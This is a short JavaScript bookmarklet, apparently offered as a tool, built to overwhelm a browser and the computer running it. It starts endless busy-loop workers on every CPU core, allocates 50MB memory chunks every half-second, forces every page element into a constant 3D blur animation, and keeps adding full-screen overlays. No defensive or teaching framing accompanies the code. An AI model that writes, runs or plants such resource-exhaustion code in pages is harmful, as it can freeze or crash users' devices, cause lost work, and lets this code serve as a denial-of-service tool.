javascript:(function(){
    /* 1. CPU SATURATION: Spawn Web Workers for every available core */
    const workerCode = "while(true){Math.atan2(Math.random(), Math.random())*Math.tan(Math.random());}";
    const blob = new Blob([workerCode], {type: 'text/javascript'});
    const workerUrl = URL.createObjectURL(blob);
    for(let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
        new Worker(workerUrl);
    }

    /* 2. RAM EXHAUSTION: Persistent Heap Allocation */
    window.massiveLeak = [];
    setInterval(() => {
        try {
            // Pushes 50MB chunks into the heap every 500ms
            const chunk = new Float64Array(6.25 * 1024 * 1024).fill(Math.random());
            window.massiveLeak.push(chunk);
        } catch(e) { console.warn("RAM Full"); }
    }, 500);

    /* 3. GPU/RENDER OVERLOAD: Forced 3D Reflow and Filters */
    const s = document.createElement('style');
    s.innerHTML = `
        @keyframes extreme {
            0% { transform: translateZ(0px) rotate(0deg); filter: blur(0px) contrast(1); }
            50% { transform: translateZ(500px) rotate(180deg); filter: blur(20px) contrast(10); }
            100% { transform: translateZ(0px) rotate(360deg); filter: blur(0px) contrast(1); }
        }
        * { 
            animation: extreme 0.1s infinite linear !important; 
            will-change: transform, filter !important;
        }
        body { perspective: 1000px; overflow: hidden; }
    `;
    document.head.appendChild(s);

    /* 4. DOM OVERLOAD (The original intent, but throttled for longevity) */
    setInterval(() => {
        const d = document.createElement('div');
        d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(5px);pointer-events:none;z-index:999';
        document.body.appendChild(d);
    }, 100);
})();
